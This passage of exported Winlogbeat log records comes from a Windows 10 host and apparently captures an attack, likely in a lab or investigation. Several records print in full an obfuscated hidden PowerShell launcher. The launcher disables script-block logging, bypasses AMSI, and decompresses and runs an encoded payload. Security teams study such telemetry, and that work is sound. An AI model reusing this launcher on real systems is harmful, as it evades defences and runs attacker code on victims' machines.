Lx{1}GuklHkkRi6ENQGvIOLqc2eKuCly'+'N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy'+'XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg'+'M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0'+'xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD'+'X0YT72p7Tu+yPUGQYu0+12R3'+'OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+'+'YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F'+'R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+'+'1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq'+'h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8'+'iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}')-f'=','o')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",600,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4565,"Provider Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.753",hXkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","8.0.0","Engine Lifecycle","-",403,"Oct 23, 2022 @ 16:53:44.409","-",event,"-",PowerShell,"-","-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Engine state is changed from Available to Stopped. 

Details: 
	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=01857599-57f2-4e3d-bbfe-00891643f17a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,"Windows PowerShell",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",Stopped,"-","-","-","-",Available,"-","-","-","	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.1682
	HostId=cd0dd99d-1cb8-4780-a4ca-1fd4faa3c0a0
	HostApplication=powershell.exe -nop -w hidden -noni -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);
	EngineVersion=5.1.19041.1682
	RunspaceId=01857599-57f2-4e3d-bbfe-00891643f17a
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","-","-","-","-","-","-",403,Classic,"-","-","-","-","-",Info,"-","-","-",PowerShell,4563,"Engine Lifecycle","-","-","-","-","-"
"Oct 23, 2022 @ 16:53:43.456",eHkMBIQByII7dpeERBAG,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 16:53:44.209","Oct 23, 2022 @ 16:53:43.554",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):
if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA9Yy''+''XBwRMaWGDwFZqg1h4huuGYkBIm8Zlg''+''M+1Ah9gmSkwv7xJNfcbPMg4L0GS4lIE+chGA7jIuqNKaxgAqUYZzz63848XPpyb0''+''xY7KPjVLm19zYiSwFKp61XBkZS/cQ5YDEAsCwYh4aOCGfWkWdUT5{1}l9RG8E27Eet5X1a03t3Crwe/EW12eW95ZAudhz3XTOwz6wjRrb91j/rI9b545NgZt4Rz2hWmjT{1}DqhutwD''+''X0YT72p7Tu+yPUGQYu0+12R3''+''OmiU63nUlmq7Dhtlqdax01m63Lpr4C/DKdFfL6Id3eX8AYCurlhdFNDL3LTr+''+''YVzeThjWbsI7Ws{1}LlhCfOp2lb07RjD7d7O4QM7jV7u+v6F''+''R923NB{1}RVw7NlsrdIqQGZ2OLYOfT40Y2d{1}Y+2u+PQ9WZuibyLBcSmaDkWUMBpaBRme3m/ax5mvHk2scGJNxg87W11cBzK1tZ3Cu6a2uR77x2RaAO+MI+''+''1cg45sNN1iCTPsjMj72edLAK4MjA2Ss2QadBdO1ZTPYH44aHI1Z/xqji9nO0rT61G6hjs4nZz4agDj2jQFGyV37W1urjz3uTf7{1}T5fa+J{1}dam1zYAfX2Z21dZj93Xba5+6svnUvD1uGvjFDGrKbhqcdj46MaHvu23e+N5gcXt33dzdw7kjTxh+AMfMRjUSzsaiEn1bDvK6+f1fZ+KsntHmtZ/RwnASYAZ2gGZRpbfHY2td3m9NMQ1Hyd8KKxBFh0Fq''+''h+Zb5gBjjbtZe{1}BNAYyvaTdb9Rt3cqZdGqvQgqD42nXLp5GQGPkJ65dyvXZDIF0FVv2/qOjQM/V5v5an09quZfL1TCmvVrOdk2DyYZ7l5sEiXkqL8frzgZSGgxr2G2GvgwckrKElQIYs6kUF{1}cM6eAljc64ENz+AD3Opw9Xn2pih4AiYOyEaqiKzpPm3iFbw6/L3U2Re8AP55v6bO49{1}vdt9EJ72aw/PT6vOFJ53iN95/gqkASQeqNiPFS+IlGPbJ8''+''iTAEBlIhOX+yx7Xl6k46MNjLe8b/wBmpytI1gsAAA{0}{0}'')-f''='',''o'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

ScriptBlock ID: 89736e6d-974f-450d-a4bc-1d417baa8ebe
Path: ","89736e6d-974f-450d-a4bc-1d417baa8ebe","if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c  $h8=((''En{1}''+''ble''+''Sc{3}ipt{2''+''}lock{''+''0}o''+''gging'')-f''L'',''a'',''B'',''r''); $gG=((''Script{2}loc{1''+''}''+''L''+''og''+''gi{0}g'')-f''n'',''k'',''B''); $zqP=[Collections.Generic.Dictionary[string,System.Object]]::new(); $g2BZk=((''''+''Enabl''+''{5}Sc''+''{2}iptBlo''+''c{3}{1}n{4''+''}oca''+''tion{0}ogging''+'''')-f''L'',''I'',''r'',''k'',''v'',''e'');If($PSVersionTable.PSVersion.Major -ge 3){ $xY=[Ref].Assembly.GetType(((''{''+''5}{''+''0}stem.{1}{''+''9''+''}n''+''{''+''9}''+''{2}''+''ement.{''+''7}{4}t''+''{8}m''+''{9''+''}''+''t''+''i{8}n.{7''+''}''+''ms''+''i{3}''+''ti{6''+''}s''+'''')-f''y'',''M'',''g'',''U'',''u'',''S'',''l'',''A'',''o'',''a'')); if ($xY) { $xY.GetField(((''''+''am''+''{4}''+''i''+''{''+''3}''+''{1}''+''i{2}Fai{0}ed''+'''')-f''l'',''n'',''t'',''I'',''s''),''NonPublic,Static'').SetValue($null,$true); }; $zz4=[Ref].Assembly.GetType(((''S{2}stem.{4}an''+''a{''+''1}''+''e''+''ment.A{''+''5}tomati''+''on.{0''+''}ti{3}s'')-f''U'',''g'',''y'',''l'',''M'',''u'')); $hbx=$zz4.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); If ($hbx) { $chfXi=$hbx.GetValue($null); $zqP.Add($h8,0); $zqP.Add($g2BZk,0); $chfXi[''HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\''+$gG]=$zqP; If($chfXi[$gG]){ $chfXi[$gG][$h8]=0; $chfXi[$gG][$g2BZk]=0; } } Else { [Ref].Assembly.GetType(((''Sy{3''+''}t''+''e''+''m.Mana{''+''2}em''+''ent.{1}{5}to''+''mation.Sc''+''ri{''+''0}tB{4}ock'')-f''p'',''A'',''g'',''s'',''l'',''u'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIABQBVWMCA7VW+2+bSBD+vVL/B1RZAlTH4Mc1D6nSLTjEbmIHBz9iu9ZpA2vYeGFtWOK4vf7vN4DJ45pUuZOK5GQfM7Oz33wzs8s0cgXlkeR1dlz6/v6dtP9sHONQUiqb''+''46pUwbOtHqiPm5Vv7pEnfZaUOVqv2zzENFqcnJhpHJNIFPPaGRE{1}SUh4wyhJFFX6W5{1}EJCYHlze3xBXSd6nyV+2M8RvM9mI7E7sBkQ5Q5GV7F9zFmWc1Z82{1}UOSvX2V1flBf1E''+''43K''+''WaJIju7RJCw5jEmq9IPNTtwuFsTRe5RN+YJX4rahEbNRm0UJXhJ+mDtjvSICLiXyHCZx+vERKRxVNwqM1MIKTIM7Zi7yPNikiRyVZpnB8wXiz+V+f70qz''+''QSNCS1biRIzNcOie+{1}S5JaB0ceI1dk''+''uQAtR8Q08heqCmJ3fEWUSpQyVpX+ixmlT7Y''+''ldm9VUp4qgZQtYrUKMX3hnj3upYwUmvILjgIPVPgeuAD4/cggXJb82cQvsOdx{1}fzm+Q4B''+''hxWbJzRX/SzpVakHR2PB4x1MK8M4JeriA''+''W6pwm+rb7VVLxVBbX2aumNYm4859RaPFp5Fv7K67Q8y{1}de53CZLGpH2LsIhdUu6Ki+FhCwZyQGplWJ9cFGR9xvEaxNGfCwykDNm''+''/KR2GlLx{1}GuklHkkRi6ENQGvIOLqc2eKuCly''+''N+qRENAr5kDVyhKShJTS+8TYladncxCSTYaTpCrZKWSpW5UcghnxqhKKErrfQqng+VB+dLeXMkFdnIjS3EL9F5z7Y00eJSJOXYgrQDB01sSlmGWIVKUO9Yixc6hfHi+/iIeJGYPkAUt3EA